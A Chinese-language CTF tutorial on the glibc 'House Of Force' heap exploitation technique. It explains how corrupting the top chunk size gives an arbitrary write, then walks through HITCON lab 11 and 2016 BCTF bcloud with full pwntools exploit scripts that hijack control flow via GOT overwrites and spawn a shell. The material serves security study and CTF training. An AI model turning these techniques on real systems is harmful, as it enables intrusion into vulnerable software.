# House Of Force

## 介紹
House Of Force 屬於 House Of XXX 系列的利用方法，House Of XXX 是 2004 年《The Malloc Maleficarum-Glibc Malloc Exploitation Techniques》中提出的一系列針對 glibc 堆分配器的利用方法。
但是，由於年代久遠《The Malloc Maleficarum》中提出的大多數方法今天都不能奏效，我們現在所指的 House Of XXX 利用相比 2004 年文章中寫的已有較大的不同。但是《The Malloc Maleficarum》依然是一篇推薦閱讀的文章，你可以在這裏讀到它的原文：
https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt

## 原理
House Of Force 是一種堆利用方法，但是並不是說 House Of Force 必須得基於堆漏洞來進行利用。如果一個堆(heap based) 漏洞想要通過 House Of Force 方法進行利用，需要以下條件：

1. 能夠以溢出等方式控制到 top chunk 的 size 域
2. 能夠自由地控制堆分配尺寸的大小

House Of Force 產生的原因在於 glibc 對 top chunk 的處理，根據前面堆數據結構部分的知識我們得知，進行堆分配時，如果所有空閒的塊都無法滿足需求，那麼就會從 top chunk 中分割出相應的大小作爲堆塊的空間。

那麼，當使用 top chunk 分配堆塊的 size 值是由用戶控制的任意值時會發生什麼？答案是，可以使得 top chunk指向我們期望的任何位置，這就相當於一次任意地址寫。然而在 glibc 中，會對用戶請求的大小和 top chunk 現有的 size 進行驗證
```
// 獲取當前的top chunk，並計算其對應的大小
victim = av->top;
size   = chunksize(victim);
// 如果在分割之後，其大小仍然滿足 chunk 的最小大小，那麼就可以直接進行分割。
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```
然而，如果可以篡改 size 爲一個很大值，就可以輕鬆的通過這個驗證，這也就是我們前面說的需要一個能夠控制top chunk size 域的漏洞。

```
(unsigned long) (size) >= (unsigned long) (nb + MINSIZE)
```
一般的做法是把 top chunk 的 size 改爲-1，因爲在進行比較時會把 size 轉換成無符號數，因此 -1 也就是說unsigned long 中最大的數，所以無論如何都可以通過驗證。

```
remainder      = chunk_at_offset(victim, nb);
av->top        = remainder;

/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
```
之後這裏會把 top 指針更新，接下來的堆塊就會分配到這個位置，用戶只要控制了這個指針就相當於實現任意地址寫任意值(write-anything-anywhere)。

**與此同時，我們需要注意的是，topchunk的size也會更新，其更新的方法如下**

```c
victim = av->top;
size   = chunksize(victim);
remainder_size = size - nb;
set_head(remainder, remainder_size | PREV_INUSE);
```

所以，如果我們想要下次在指定位置分配大小爲 x 的 chunk，我們需要確保 remainder_size 不小於 x+ MINSIZE。

## 簡單示例1
在學習完 HOF 的原理之後，我們這裏通過一個示例來說明 HOF 的利用，這個例子的目標是通過HOF來篡改 `malloc@got.plt` 實現劫持程序流程

```
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;        // <=== 這裏把top chunk的size域改爲0xffffffffffffffff
    malloc(-4120);  // <=== 減小top chunk指針
    malloc(0x10);   // <=== 分配塊實現任意地址寫
}
```

首先，我們分配一個 0x10 字節大小的塊

```
0x602000:	0x0000000000000000	0x0000000000000021 <=== ptr
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1 <=== top chunk
0x602030:	0x0000000000000000	0x0000000000000000
```
之後把 top chunk 的 size 改爲 0xffffffffffffffff，在真正的題目中，這一步可以通過堆溢出等漏洞來實現。
因爲 -1 在補碼中是以 0xffffffffffffffff 表示的，所以我們直接賦值 -1 就可以。

```
0x602000:	0x0000000000000000	0x0000000000000021 <=== ptr
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0xffffffffffffffff <=== top chunk size域被更改
0x602030:	0x0000000000000000	0x0000000000000000
```
注意此時的 top chunk 位置，當我們進行下一次分配的時候就會更改 top chunk 的位置到我們想要的地方

```
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602020 <=== top chunk此時一切正常
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
接下來我們執行`malloc(-4120);`，-4120是怎麼得出的呢？
首先，我們需要明確要寫入的目的地址，這裏我編譯程序後，0x601020 是 `malloc@got.plt` 的地址

```
0x601020:	0x00007ffff7a91130 <=== malloc@got.plt
```
所以我們應該將 top chunk 指向 0x601010 處，這樣當下次再分配 chunk 時，就可以分配到 `malloc@got.plt` 處的內存了。

之後明確當前 top chunk 的地址，根據前面描述，top chunk 位於 0x602020，所以我們可以計算偏移如下

0x601010-0x602020=-4112

此外，用戶申請的內存大小，一旦進入申請內存的函數中就變成了無符號整數。

```c
void *__libc_malloc(size_t bytes) {
```

如果想要用戶輸入的大小經過內部的 `checked_request2size`可以得到這樣的大小，即

```c
/*
   Check if a request is so large that it would wrap around zero when
   padded and aligned. To simplify some other code, the bound is made
   low enough so that adding MINSIZE will also not wrap around zero.
 */

#define REQUEST_OUT_OF_RANGE(req)                                              \
    ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
/* pad request bytes into a usable size -- internal version */
//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
#define request2size(req)                                                      \
    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)                           \
         ? MINSIZE                                                             \
         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

/*  Same, except also perform argument check */

#define checked_request2size(req, sz)                                          \
    if (REQUEST_OUT_OF_RANGE(req)) {                                           \
        __set_errno(ENOMEM);                                                   \
        return 0;                                                              \
    }                                                                          \
    (sz) = request2size(req);
```

一方面，我們需要繞過 REQUEST_OUT_OF_RANGE(req) 這個檢測，即我們傳給 malloc 的值在負數範圍內，不得大於 -2 * MINSIZE，這個一般情況下都是可以滿足的。

另一方面，在滿足對應的約束後，我們需要使得 `request2size`正好轉換爲對應的大小，也就是說，我們需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK 恰好爲-4112。首先，很顯然，-4112 是 chunk 對齊的，那麼我們只需要將其分別減去 SIZE_SZ，MALLOC_ALIGN_MASK 就可以得到對應的需要申請的值。其實我們這裏只需要減 SIZE_SZ 就可以了，因爲多減的 MALLOC_ALIGN_MASK 最後還會被對齊掉。而**如果 -4112 不是 MALLOC_ALIGN 的時候，我們就需要多減一些了。當然，我們最好使得分配之後得到的 chunk 也是對齊的，因爲在釋放一個 chunk 的時候，會進行對齊檢查。**

因此，我們當調用`malloc(-4120)`之後，我們可以觀察到 top chunk 被抬高到我們想要的位置

```
0x7ffff7dd1b20 <main_arena>:\	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000601010 <=== 可以觀察到top chunk被抬高
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
之後，我們分配的塊就會出現在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的內容了。

但是需要注意的是，在被抬高的同時，malloc@got 附近的內容也會被修改。

```c
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
```

## 簡單示例2
在上一個示例中，我們演示了通過 HOF 使得 top chunk 的指針減小來修改位於其上面(低地址)的got表中的內容，
但是 HOF 其實也可以使得 top chunk 指針增大來修改位於高地址空間的內容，我們通過這個示例來演示這一點

```
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;                 <=== 修改top chunk size
    malloc(140737345551056); <=== 增大top chunk指針
    malloc(0x10);
}
```
我們可以看到程序代碼與簡單示例1基本相同，除了第二次 malloc 的 size 有所不同。
這次我們的目標是 malloc_hook，我們知道 malloc_hook 是位於 libc.so 裏的全局變量值，首先查看內存佈局

```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/t1
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/t1
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/t1
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```
可以看到 heap 的基址在 0x602000，而 libc 的基址在 0x7ffff7a0d000，因此我們需要通過 HOF 擴大 top chunk指針的值來實現對 malloc_hook 的寫。
首先，由調試得知 __malloc_hook 的地址位於 0x7ffff7dd1b10 ，採取計算

0x7ffff7dd1b00-0x602020-0x10=140737345551056
經過這次 malloc 之後，我們可以觀察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00

```
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x00007ffff7dd1b00 <=== top chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
之後，我們只要再次分配就可以控制 0x7ffff7dd1b10 處的 __malloc_hook 值了

```
rax = 0x00007ffff7dd1b10
    
0x400562 <main+60>        mov    edi, 0x10
0x400567 <main+65>        call   0x400410 <malloc@plt>
```

## 小總結
在這一節中講解了 House Of Force 的原理並且給出了兩個利用的簡單示例，通過觀察這兩個簡單示例我們會發現其實HOF的利用要求還是相當苛刻的。

* 首先，需要存在漏洞使得用戶能夠控制 top chunk 的 size 域。
* 其次，**需要用戶能自由控制 malloc 的分配大小**
* 第三，分配的次數不能受限制

其實這三點中第二點往往是最難辦的，CTF 題目中往往會給用戶分配堆塊的大小限制最小和最大值使得不能通過HOF 的方法進行利用。

## HITCON training lab 11
[題目鏈接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/house-of-force/hitcontraning_lab11)

這裏，我們主要修改其 magic 函數爲



### 基本信息

```shell
➜  hitcontraning_lab11 git:(master) file bamboobox     
bamboobox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped
➜  hitcontraning_lab11 git:(master) checksec bamboobox 
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

該程序是一個 64 位的動態鏈接程序。

### 基本功能

需要注意的是，該程序開始時即申請了 0x10 的內存，用來保留**兩個函數指針**。

該程序大概就是對於盒子裏的物品進行添加和刪除

1. 展示盒子裏的內容，依次盒子裏每一個物品的名字。
2. 向盒子裏添加物品，根據用戶輸入的大小來爲每一個物品申請對應的內存，作爲其存儲名字的空間。但是需要注意的是，這裏讀取名字使用的是 `read` 函數，讀取長度的參數是用戶輸入的 v2，而 read 的第三個參數是無符號整數，如果我們輸入負數，就可以讀取任意長度。但是我們需要確保該數值滿足`REQUEST_OUT_OF_RANGE` 的約束，所以這裏存在**任意長度堆溢出**的漏洞。但即使這樣，第一次的時候也比較難以利用，因爲初始時候堆的 top chunk 的大小一般是不會很大的。
3. 修改物品的名字，根據給定的索引，以及大小，向指定索引的物品中讀取指定長度名字。這裏長度由用戶來讀入，也存在**任意長度堆溢出**的漏洞。
4. 刪除物品，將對應物品的名字的大小置爲0，並將對應的 content 置爲 NULL。

此外，由於該程序主要是一個演示程序，所以程序中有一個 magic 函數，可以直接讀取 flag。

### 利用

由於程序中有個 magic 函數，所以我們的核心目的是覆蓋某個指針爲 magic 函數的指針。這裏，程序在開始的時候申請了一塊內存來存儲兩個函數指針，hello_message用於程序開始時使用，goodbye_message 用於在程序結束時使用，所以我們可以利用覆蓋 goodbye_message 來控制程序執行流。具體思路如下

1. 添加物品，利用堆溢出漏洞覆蓋 top chunk 的大小爲 -1，即 64 位最大值。
2. 利用 house of force 技巧，分配 chunk 至堆的基地址。
3. 覆蓋 goodbye_message 爲magic 函數地址來控制程序執行流

**這裏需要注意的是，在觸發top chunk 轉移到指定位置時，所使用的大小應該合適，以便於設置新的 top chunk 大小，從而可以繞過下一次分配top chunk 的檢測。**

exp 如下

```shell
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./bamboobox')
context.log_level = 'debug'


def additem(length, name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)


def modify(idx, length, name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)


def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


def show():
    r.recvuntil(":")
    r.sendline("1")


magic = 0x400d49
# we must alloc enough size, so as to successfully alloc from fake topchunk
additem(0x30, "ddaa")  # idx 0
payload = 0x30 * 'a'  # idx 0's content
payload += 'a' * 8 + p64(0xffffffffffffffff)  # top chunk's prev_size and size
# modify topchunk's size to -1
modify(0, 0x41, payload)
# top chunk's offset to heap base
offset_to_heap_base = -(0x40 + 0x20)
malloc_size = offset_to_heap_base - 0x8 - 0xf
#gdb.attach(r)
additem(malloc_size, "dada")
additem(0x10, p64(magic) * 2)
print r.recv()
r.interactive()

```

當然，這一題也可以使用 unlink 的方法來做。

## 2016 BCTF bcloud
[題目鏈接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/house-of-force/2016_bctf_bcloud)

### 基本信息

```shell
➜  2016_bctf_bcloud git:(master) file bcloud   
bcloud: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped
➜  2016_bctf_bcloud git:(master) checksec bcloud  
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看出，這是一個動態鏈接的 32 位程序，主要開啓了 Canary 保護與 NX 保護。

### 基本功能

程序大概是一個雲筆記管理系統。首先，程序會進行一些初始化，設置用戶的名字，組織，host。程序主要有以下幾個功能

1. 新建note，根據用戶的輸入x申請x+4的空間作爲note的大小。
2. 展示note，啥功能也沒有。。
3. 編輯note，根據用戶指定的 note 編輯對應的內容。
4. 刪除note，刪除對應note。
5. 同步note，標記所有的note已經被同步。

然而在這五個功能中並沒有發現啥漏洞，，，重新看程序，結果發現程序在初始化的時候出現了漏洞。。

初始化名字

```c
unsigned int init_name()
{
  char s; // [esp+1Ch] [ebp-5Ch]
  char *tmp; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(&s, 0, 0x50u);
  puts("Input your name:");
  read_str(&s, 64, '\n');
  tmp = (char *)malloc(0x40u);
  name = tmp;
  strcpy(tmp, &s);
  info(tmp);
  return __readgsdword(0x14u) ^ v3;
}
```

這裏如果程序讀入的名字爲64個字符，那麼當程序在使用info函數輸出對應的字符串時，就會輸出對應的tmp指針內容，也就是說**泄露了堆的地址**。。

初始化組織和org的時候存在漏洞

```c
unsigned int init_org_host()
{
  char s; // [esp+1Ch] [ebp-9Ch]
  char *v2; // [esp+5Ch] [ebp-5Ch]
  char v3; // [esp+60h] [ebp-58h]
  char *v4; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(&s, 0, 0x90u);
  puts("Org:");
  read_str(&s, 64, 10);
  puts("Host:");
  read_str(&v3, 64, 10);
  v4 = (char *)malloc(0x40u);
  v2 = (char *)malloc(0x40u);
  org = v2;
  host = v4;
  strcpy(v4, &v3);
  strcpy(v2, &s);
  puts("OKay! Enjoy:)");
  return __readgsdword(0x14u) ^ v5;
}
```

當讀入組織時，給定 64 字節，會覆蓋 v2 的低地址。與此同時，我們可以知道 v2 是與 top chunk 相鄰的 chunk，而 v2 恰好與 org 相鄰，那麼由於在 32 位程序中，一般都是 32 位全部都使用，這裏 v2 所存儲的內容，幾乎很大程度上都不是 `\x00` ，所以當執行 strcpy 函數向 v2 中拷貝內容時，很有可能會覆蓋top chunk。這就是漏洞所在。

### 利用

1. 利用初始化名字處的漏洞泄漏堆的基地址。。
2. 利用 house of force 將 top chunk 分配至全局的 0x0804B0A0 的 &notesize-8 處，當再次申請內存時，便返回notesize地址處的內存，從而我們就可以控制所有note的大小以及對應的地址了。
3. 修改前三個 note 的大小爲16，並修改其指針爲 free@got，atoi@got，atoi@got
4. 將 free@got 修改爲 puts@plt。
5. 泄漏 atoi 地址。
6. 再次修改另外一個 atoi got 項爲 system 地址，從而拿到shell。

具體腳本如下

```python
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./bcloud"
bcloud = ELF("./bcloud")
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./bcloud")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')


def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset


def exp():
    # leak heap base
    p.sendafter('Input your name:\n', 'a' * 64)
    p.recvuntil('Hey ' + 'a' * 64)
    # sub name's chunk' s header
    heap_base = u32(p.recv(4)) - 8
    log.success('heap_base: ' + hex(heap_base))
    p.sendafter('Org:\n', 'a' * 64)
    p.sendlineafter('Host:\n', p32(0xffffffff))
    # name,org,host, for each is (0x40+8)
    topchunk_addr = heap_base + (0x40 + 8) * 3

    # make topchunk point to 0x0804B0A0-8
    p.sendlineafter('option--->>', '1')
    notesize_addr = 0x0804B0A0
    notelist_addr = 0x0804B120
    targetaddr = notesize_addr - 8
    offset_target_top = targetaddr - topchunk_addr
    # 4 for size_t, 7 for malloc_allign
    malloc_size = offset_target_top - 4 - 7
    # plus 4 because malloc(v2 + 4);
    p.sendlineafter('Input the length of the note content:\n',
                    str(malloc_size - 4))
    # most likely malloc_size-4<0...
    if malloc_size - 4 > 0:
        p.sendlineafter('Input the content:\n', '')

    #gdb.attach(p)
    # set notesize[0] = notesize[1] = notesize[2]=16
    # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got
    p.sendlineafter('option--->>', '1')
    p.sendlineafter('Input the length of the note content:\n', str(1000))

    payload = p32(16) * 3 + (notelist_addr - notesize_addr - 12) * 'a' + p32(
        bcloud.got['free']) + p32(bcloud.got['atoi']) * 2
    p.sendlineafter('Input the content:\n', payload)

    # overwrite free@got with puts@plt
    p.sendlineafter('option--->>', '3')
    p.sendlineafter('Input the id:\n', str(0))
    p.sendlineafter('Input the new content:\n', p32(bcloud.plt['puts']))

    # leak atoi addr by fake free
    p.sendlineafter('option--->>', '4')
    p.sendlineafter('Input the id:\n', str(1))
    atoi_addr = u32(p.recv(4))
    libc_base = atoi_addr - libc.symbols['atoi']
    system_addr = libc_base + libc.symbols['system']
    log.success('libc base addr: ' + hex(libc_base))

    # overwrite atoi@got with system
    p.sendlineafter('option--->>', '3')
    p.sendlineafter('Input the id:\n', str(2))
    p.sendlineafter('Input the new content:\n', p32(system_addr))

    # get shell
    p.sendlineafter('option--->>', '/bin/sh\x00')
    p.interactive()


if __name__ == "__main__":
    exp()
```



## 題目

- [2016 Boston Key Party CTF cookbook](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6)
